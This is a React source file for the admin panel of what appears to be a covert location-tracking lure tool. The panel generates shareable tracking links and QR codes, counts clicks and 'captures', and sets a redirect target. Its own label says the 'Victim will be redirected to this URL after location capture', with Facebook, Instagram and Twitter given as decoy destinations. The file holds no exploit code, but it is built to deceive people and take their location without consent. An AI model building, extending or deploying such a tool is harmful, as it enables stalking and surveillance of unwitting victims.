import { useState } from 'react';
import { Settings, Link2, Copy, Trash2, QrCode, Plus } from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Switch } from '@/components/ui/switch';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { toast } from 'sonner';
import { getConfig, saveConfig, generateTrackingLink, updateTrackingLink, deleteTrackingLink, TrackingLink } from '@/utils/config';
import { QRCodeSVG } from 'qrcode.react';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';

const ConfigurationPanel = () => {
  const config = getConfig();
  const [targetUrl, setTargetUrl] = useState(config.defaultTargetUrl);
  const [trackingLinks, setTrackingLinks] = useState<TrackingLink[]>(config.trackingLinks);
  const [showQR, setShowQR] = useState(false);
  const [selectedLink, setSelectedLink] = useState<string>('');

  const handleSaveUrl = () => {
    if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
      toast.error('URL must start with http:// or https://');
      return;
    }
    saveConfig({ defaultTargetUrl: targetUrl });
    toast.success('Target URL saved successfully');
  };

  const handleGenerateLink = () => {
    const link = generateTrackingLink();
    setTrackingLinks([...trackingLinks, link]);
    toast.success('New tracking link generated');
  };

  const handleCopyLink = (linkId: string) => {
    const baseUrl = window.location.origin;
    const fullUrl = `${baseUrl}/track?id=${linkId}`;
    navigator.clipboard.writeText(fullUrl);
    toast.success('Link copied to clipboard');
  };

  const handleShowQR = (linkId: string) => {
    setSelectedLink(linkId);
    setShowQR(true);
  };

  const handleToggleActive = (linkId: string, active: boolean) => {
    updateTrackingLink(linkId, { active });
    setTrackingLinks(trackingLinks.map(link => 
      link.id === linkId ? { ...link, active } : link
    ));
    toast.success(`Link ${active ? 'activated' : 'deactivated'}`);
  };

  const handleDeleteLink = (linkId: string) => {
    deleteTrackingLink(linkId);
    setTrackingLinks(trackingLinks.filter(link => link.id !== linkId));
    toast.success('Link deleted');
  };

  const baseUrl = window.location.origin;

  return (
    <div className="space-y-6">
      {/* Target URL Configuration */}
      <Card className="backdrop-blur-sm bg-card/50 border-border/50">
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Settings className="w-5 h-5" />
            Target URL Configuration
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <Label>Target Website URL</Label>
            <p className="text-sm text-muted-foreground">
              Victim will be redirected to this URL after location capture
            </p>
            <div className="flex gap-2">
              <Input
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                placeholder="https://facebook.com"
                className="flex-1"
              />
              <Button onClick={handleSaveUrl}>Save</Button>
            </div>
          </div>
          <div className="flex flex-wrap gap-2">
            <span className="text-sm text-muted-foreground">Examples:</span>
            {['https://facebook.com', 'https://instagram.com', 'https://twitter.com'].map(url => (
              <Button
                key={url}
                variant="outline"
                size="sm"
                onClick={() => setTargetUrl(url)}
              >
                {url.replace('https://', '')}
              </Button>
            ))}
          </div>
        </CardContent>
      </Card>

      {/* Tracking Link Generation */}
      <Card className="backdrop-blur-sm bg-card/50 border-border/50">
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Link2 className="w-5 h-5" />
            Tracking Links
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <Button onClick={handleGenerateLink} className="w-full gap-2">
            <Plus className="w-4 h-4" />
            Generate New Tracking Link
          </Button>

          {trackingLinks.length > 0 && (
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Link ID</TableHead>
                  <TableHead>Target URL</TableHead>
                  <TableHead>Created</TableHead>
                  <TableHead>Clicks</TableHead>
                  <TableHead>Captures</TableHead>
                  <TableHead>Status</TableHead>
                  <TableHead>Actions</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {trackingLinks.map((link) => (
                  <TableRow key={link.id}>
                    <TableCell className="font-mono">{link.id}</TableCell>
                    <TableCell className="truncate max-w-[200px]">{link.targetUrl}</TableCell>
                    <TableCell>{new Date(link.createdAt).toLocaleDateString()}</TableCell>
                    <TableCell>{link.clicks}</TableCell>
                    <TableCell>{link.captures}</TableCell>
                    <TableCell>
                      <Switch
                        checked={link.active}
                        onCheckedChange={(active) => handleToggleActive(link.id, active)}
                      />
                    </TableCell>
                    <TableCell>
                      <div className="flex gap-1">
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => handleCopyLink(link.id)}
                        >
                          <Copy className="w-3 h-3" />
                        </Button>
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => handleShowQR(link.id)}
                        >
                          <QrCode className="w-3 h-3" />
                        </Button>
                        <Button
                          size="sm"
                          variant="destructive"
                          onClick={() => handleDeleteLink(link.id)}
                        >
                          <Trash2 className="w-3 h-3" />
                        </Button>
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          )}
        </CardContent>
      </Card>

      {/* QR Code Dialog */}
      <Dialog open={showQR} onOpenChange={setShowQR}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>QR Code</DialogTitle>
          </DialogHeader>
          <div className="flex flex-col items-center gap-4 p-4">
            <QRCodeSVG
              value={`${baseUrl}/track?id=${selectedLink}`}
              size={256}
              level="H"
            />
            <p className="text-sm text-muted-foreground text-center">
              {baseUrl}/track?id={selectedLink}
            </p>
            <Button onClick={() => handleCopyLink(selectedLink)} className="w-full gap-2">
              <Copy className="w-4 h-4" />
              Copy Link
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default ConfigurationPanel;
